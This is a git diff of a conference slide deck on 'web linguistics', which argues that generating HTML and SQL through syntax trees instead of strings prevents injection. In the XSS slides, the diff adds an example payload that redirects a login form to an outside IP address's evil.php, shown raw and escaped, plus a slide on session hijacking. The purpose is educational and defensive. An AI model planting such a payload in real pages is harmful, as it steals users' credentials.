@@ -3,9 +3,11 @@ title: "Web Linguistics : Towards Higher Fluency"
 defaults:
   data-x: '+1000'
   data-y: '+0'
-transition-duration: 1000
+transition-duration: 0
 images:
   - larry_thumb.png
+  - larry_cry.png
+  - temple.png
 ---
 
 # Web Linguistics
@@ -277,6 +279,7 @@ its **syntax tree**
 
 * Programming languages
 * Markup & styling languages
+* Data languages
 * Network protocols
 
 ---
@@ -303,78 +306,21 @@ use **syntax trees**
 to do so
 
 ---
-=  class="center"
-
-```dot
-digraph commmunication {
-  edge[dir=none color=blue]
-  node[label="" shape=circle color=blue]
-
-  subgraph sub_0 {
-    x1 -> y1 -> z1;
-    y1 -> z2;
-    y1 -> z3;
-  }
-
-  subgraph sub_1 {
-    rankdir=LR;
-    rank=same;
-    node[shape=point];
-    serializer[label=serializer shape=box];
-    network[label=network shape=none];
-    parser[label=parser shape=box];
-    aa -> serializer -> network -> parser -> bb;
-  }
-
-  subgraph sub_2 {
-    a -> b -> c;
-    b -> d;
-    b -> e;
-  }
-
-  subgraph sub_3 {
-    rank="same";
-    edge[style="invisible",dir="none"];
-    y1 -> aa;
-    bb -> b;
-  }
-}
-```
-
----
+= class='center'
 
 # Why ?
 
----
-
-## Security
 
 ---
+= class='center'
 
 # XSS
 ## Cross site scripting
 
----
-
-> [CVE-2013-1857] XSS Vulnerability<br/> in the `sanitize` helper of Ruby on Rails
-
-&nbsp; &mdash; @tenderlove on rails-security-ann
-
-<p></p>
-
-> Given all the fun we've had with security issues
-
-&nbsp; &mdash; Rails 4 beta announcement
-
-```notes
-It's been an interesting winter for Rails security issues, and hopefully security is still at the front of peoples minds.
-```
 
 ---
 
 ## XSS
-
-TODO make this more concrete ; find real life example
 
 Code like this
 
@@ -387,10 +333,9 @@ Code like this
 
 Will lead to malicious injection
 
-```html
-<div>
-  <script>evil code</script>
-</div>
+```javascript
+document.getElementById('login_form').
+  action="http://208.246.24.14/evil.php"
 ```
 
 ```notes
@@ -400,12 +345,19 @@ This gives an attacker all privileges the current user of your app has.
 ```
 
 ---
+= class='statement center'
+
+**session hijacking**
+
+attacker can surf the site with user credentials
+
+---
 ## Escape!
 
 The common wisdom is to "escape" the inserted value
 
 ```html
-<div>#{ html_escape(@post.body) }</div>
+<div>#{ escape_html(@post.body) }</div>
 ```
 
 &nbsp;
@@ -415,7 +367,7 @@ Now the code is harmless
 
 ```html
 <div>
-  &lt;script&gt;evil code&lt;/script&gt
+  &lt;script&gt;document.getElementById('login_form').action=http://208.246.24.14/evil.php&lt;/script&gt;
 </div>
 ```
 
@@ -464,7 +416,21 @@ I actually noticed this myself although less extreme, when sending a parcel to a
 
 ---
 
-TODO this also need to be more clear, why is it hard? it's hard because it's not automated. We need to make it "physically" impossible for the programmer to get this wrong.
+> [CVE-2013-1857] XSS Vulnerability<br/> in the `sanitize` helper of Ruby on Rails
+
+&nbsp; &mdash; @tenderlove on rails-security-ann
+
+<p></p>
+
+> Given all the fun we've had with security issues
+
+&nbsp; &mdash; Rails 4 beta announcement
+
+```notes
+It's been an interesting winter for Rails security issues, and hopefully security is still at the front of peoples minds.
+```
+
+---
 
 Manual escaping? **hard**
 
@@ -510,6 +476,44 @@ Semantics of string are twofold
 * a string
 * a textual representation of HTML
 
+---
+=  class="center"
+
+```dot
+digraph commmunication {
+  edge[dir=none color=blue]
+  node[label="" shape=circle color=blue]
+
+  subgraph sub_0 {
+    x1 -> y1 -> z1;
+    y1 -> z2;
+    y1 -> z3;
+  }
+
+  subgraph sub_1 {
+    rankdir=LR;
+    rank=same;
+    node[shape=point];
+    serializer[label=serializer shape=box];
+    network[label=network shape=none];
+    parser[label=parser shape=box];
+    aa -> serializer -> network -> parser -> bb;
+  }
+
+  subgraph sub_2 {
+    a -> b -> c;
+    b -> d;
+    b -> e;
+  }
+
+  subgraph sub_3 {
+    rank="same";
+    edge[style="invisible",dir="none"];
+    y1 -> aa;
+    bb -> b;
+  }
+}
+```
 
 ---
 
@@ -547,16 +551,19 @@ How is this different? At the surface this may seem not much different from the 
 ```
 
 ---
+= class='center'
 
 # Injection, revisited
 
 ---
+= class='center'
 
 ```ruby
 @users = User.where(name: params[:query])
 ```
 
-&nbsp;
+---
+= class='center'
 
 ```dot
 graph ar {
@@ -583,6 +590,7 @@ This is good because we can express our intent (semantics), and the data structu
 ```
 
 ---
+= class='center'
 
 ```ruby
 def helper
@@ -590,7 +598,8 @@ def helper
 end
 ```
 
-&nbsp;
+---
+= class='center'
 
 ```dot
 graph html_safe {
@@ -601,90 +610,123 @@ graph html_safe {
 ```
 
 ---
-=  data-x="-500" data-y="-400" data-z="1000" class='center'
-## Spot the differences
+= class='center'
+
+# HTML
 
 ---
-=  data-y="+500" data-z="1000" data-x="+0"
+= class='statement center'
 
+Language, a **set of strings**
 
+Browsers accept **every string**
 
----
-
-HTML "parsers" are realy rewriting engines.
-
-To make sure the same tree gets reconstructed, we should stay within a strict subset.
-
-Let someone else handle this hairy mess.
+Is this a language?
 
 ---
+= class='center'
 
-# Tooling ... what if?
-
----
-
+# Postel's principle
 
 ---
+= class='statement center'
 
-## What if for each we had
+Be **conservative** in what you **send**
 
-1. A solid data type for syntax trees
-2. quality parsers/generator
-3. problem domain specific APIs to deal with 1.
-
----
-
-## Apples and snakes architecture
-
-Keep the **snakes** (strings) out of the app
-
-parse/generate at the app boundary
-
-Inside the app, only **apples** (syntax trees)
-
-`TODO insert hand-drawn schematic here`
+be **liberal** in what you **accept**
 
 ---
+= class='center'
 
-## Welcome to the future
-
-- SQL :: Sequel, Arel
-- (S)CSS :: Sass::SCSS::CssParser / Sass::Tree::RootNode
-- JSON, XML, YAML :: take your pick
-- Ruby :: ParseTree, Melbourne, Parser gem
-- URL :: standard library
-
-```notes
-There's already a lot out there, but still some missing pieces. Plus often tedious to work with.
-```
+<img width='400px' src='larry_cry.png' />
 
 ---
+= class='statement center'
+
+HTML "parsers" are **rewriting engines**
+
+To stay safe we should stay strict
+
+Let someone else handle this hairy mess
+
+---
+= class='center'
 
 # How?
 
 ---
 
-Using data structures over trees
+## Shopping list
 
-in this case is a must for security
+1. A solid data type for syntax trees
+2. quality parsers/generators
+3. problem domain specific APIs to deal with 1.
 
-but it buys us more
+---
+= class='center'
+# Apples and snakes architecture
+
+---
+= class='statement center'
+
+Keep the **snakes** out of the app
+
+parse/generate at the app boundary
+
+Inside the app, only **apples**
 
 ---
 
-Consider HTML a serialization format
+![](snakes_and_apples.png)
 
-Generate HTML 4.01, HTML5, XHTML 1.0, XHTML5
+---
+=  class="center"
 
-all from the same DOM
+```dot
+digraph commmunication {
+  edge[dir=none color=blue]
+  node[label="" shape=circle color=blue]
 
-```notes
-HTML is hard, depending on context you need to html, url, css or json escape. And there are multiple versions, but conceptually the DOM hasn't changed.
+  subgraph sub_0 {
+    x1 -> y1 -> z1;
+    y1 -> z2;
+    y1 -> z3;
+  }
+
+  subgraph sub_1 {
+    rankdir=LR;
+    rank=same;
+    node[shape=point];
+    serializer[label=serializer shape=box];
+    network[label=network shape=none];
+    parser[label=parser shape=box];
+    aa -> serializer -> network -> parser -> bb;
+  }
+
+  subgraph sub_2 {
+    a -> b -> c;
+    b -> d;
+    b -> e;
+  }
+
+  subgraph sub_3 {
+    rank="same";
+    edge[style="invisible",dir="none"];
+    y1 -> aa;
+    bb -> b;
+  }
+}
 ```
 
+
+---
+= class='center'
+
+# Building trees
+
 ---
 
-## Nokogiri
+## Objects
 
 ```ruby
 @doc = Nokogiri::HTML::Document.new
@@ -701,9 +743,7 @@ The default for doing these kind of things, but ; tedious to work with ; only HT
 
 ---
 
-## Literal notations
-
-Builder pattern
+# Builder
 
 ```ruby
 HTML::Builder.new do
@@ -723,17 +763,31 @@ Important that the result can be recombined, not the case with nokogiri.
 
 ---
 
-## Literal notations
 
-S-expressions
+# S-expressions
+
+```lisp
+('p ('em "hello, world"))
+```
+
+&nbsp;
 
 ```ruby
-tag(:p, tag(:em, "hello, world"))
+[:p, [:em, "hello, world"]]
 ```
 
 ```notes
 Simple, lightweight, easy to reason about.
 ```
+
+---
+= class='statement center'
+
+The data structure must be
+
+**composable** and
+
+**easy to reason** about
 
 ---
 
@@ -756,83 +810,65 @@ Other ideas : add file/line numbers in dev mode ; structural validation ; presen
 ```
 
 ---
+= class='center'
 
-## Hexp
+# Hexp
 
-HTML Expressions
-
-```ruby
-class Widget < Struct.new(:user)
-  def to_hexp
-    if user.logged_in?
-      H[:p, [
-        [:a, {href: user_path(user), user.name}]
-        "(#{user.karma})"
-        ]
-      ]
-    else
-      H[:a, {href: login_path}, "Sign in"]
-    end
-  end
-end
-```
-
-!! <iframe src="https://github.com/plexus/hexp#readme" />
-
-https://github.com/plexus/hexp
-
-```notes
-This is one attempt at making this a reality.
-```
+## Demo
 
 ---
+= class='center'
 
-````ruby
-class Nav
-  def initialize(cart)
-    @cart=cart
-  end
-
-  def to_dom
-    [:ul, [
-        home_link,
-        cart_link
-      ].compact
-    ]
-  end
-
-  def cart_link
-    unless @cart.empty?
-      [:li, {class: 'cart-icon'}, link_to('Cart', cart_path)]
-    end
-  end
-end
-````
-
----
 # In summary
 
 ---
-## Don't serialize by hand
+= class='center'
 
-
-We're reinventing the wheel (badly)
-
-We have serialization mixed with business logic. This violates the Single Responsibility Principle.
-
-Let a library do the serialization for you.
+# Don't serialize by hand
 
 ---
-## Aim high level
+= class='statement center'
 
-What the app cares about are the semantics of the output it produces. Semantics lie in the interpretation, but the closest representation is the syntax tree
+Don't **reinvent the wheel** (badly)
+
+mixing s11n with logic violates **SRP**
+
+Let a library do the serialization for you
 
 ---
-## More expressive power
+= class='center'
 
-You can do more with data structures than with mere strings, so your code can be more powerful, more expressive.
+# Aim high level
 
-Incidentally, this also largely prevents injection attacks, which alone is enough justification.
+---
+= class='statement center'
+
+You care about **semantics**
+
+the closest representation
+
+is the **syntax tree**
+
+---
+= class='center'
+
+# More expressive power
+
+---
+= class='statement center'
+
+Data structures are **programmable**
+
+they make your code
+
+more **powerful** and **expressive**
+
+---
+= class='statement center'
+
+Oh and BTW
+
+injection attacks
 
 ---
 
@@ -876,7 +912,6 @@ Q ?
 
 ## Conference talks
 
-* [The Science of Insecurity](http://www.youtube.com/watch?v=3kEfedtQVOY) by Meredith L. Patterson
 
 ---
 
@@ -887,22 +922,22 @@ Q ?
 
 ---
 
-## Academia
+## Security
 
 * [Langsec](http://langsec.org/)
+* [The Science of Insecurity](http://www.youtube.com/watch?v=3kEfedtQVOY) by Meredith L. Patterson
+* [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 
 ---
 
-## Libraries
+## Software
+
+Ruby
 
 * [Formless](https://github.com/Wardrop/Formless)
   Completely transparent, unobtrusive form populator for web applications and content scrapers
 * [Loofah](https://github.com/flavorjones/loofah)
   HTML/XML manipulation and sanitization based on Nokogiri
-
----
-
-## In other languages
 
 Common Lisp
 
@@ -1144,10 +1179,3 @@ Haskell
 !! }
 !! ```
 !!
-
----
-= class='hidden'
-
-![](temple.jpg)
-
-!!used from CSS, added here so it gets copied in
